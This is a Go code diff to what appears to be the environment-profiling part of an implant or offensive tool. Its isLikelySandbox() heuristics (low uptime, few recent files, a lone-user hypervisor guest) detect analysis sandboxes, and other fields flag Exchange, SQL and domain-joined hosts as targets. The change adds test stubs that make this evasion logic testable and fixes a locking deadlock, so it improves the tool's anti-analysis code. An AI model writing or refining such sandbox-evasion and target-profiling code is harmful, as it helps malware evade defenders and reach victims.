@@ -85,6 +85,13 @@ type EnvironmentDetector struct {
 	isExch         bool
 	isSQL          bool
 	isHypervisor   bool
+	// Test stubs: when stubEnv is true, isLikelySandbox uses these instead
+	// of live probes (uptime, recent files, hypervisor), making classify()
+	// hermetic under test on any host.
+	stubEnv         bool
+	stubUptimeMin   int64
+	stubRecentFiles int
+	stubHypervisor  bool
 }
 
 func NewEnvironmentDetector() *EnvironmentDetector {
@@ -109,10 +116,12 @@ func (ed *EnvironmentDetector) Analyze() *OpsProfile {
 }
 
 func (ed *EnvironmentDetector) ForceReanalyze() *OpsProfile {
+	// Reset under the lock, then run Analyze unlocked: Analyze takes the
+	// same non-reentrant mutex, so holding it here would self-deadlock.
 	ed.mu.Lock()
-	defer ed.mu.Unlock()
 	ed.analyzed = false
 	ed.lastCheck = time.Time{}
+	ed.mu.Unlock()
 	return ed.Analyze()
 }
 
@@ -245,14 +254,18 @@ func (ed *EnvironmentDetector) isLikelySandbox() bool {
 		return true
 	}
 	uptime := ed.getUptimeMinutes()
+	recentFiles := ed.countRecentFiles()
+	hypervisor := ed.isHypervisor
+	if ed.stubEnv {
+		uptime, recentFiles, hypervisor = ed.stubUptimeMin, ed.stubRecentFiles, ed.stubHypervisor
+	}
 	if uptime < 10 {
 		return true
 	}
-	recentFiles := ed.countRecentFiles()
 	if recentFiles < 2 {
 		return true
 	}
-	if ed.isHypervisor && ed.users <= 1 && !ed.isDomainJoined {
+	if hypervisor && ed.users <= 1 && !ed.isDomainJoined {
 		return true
 	}
 	return false
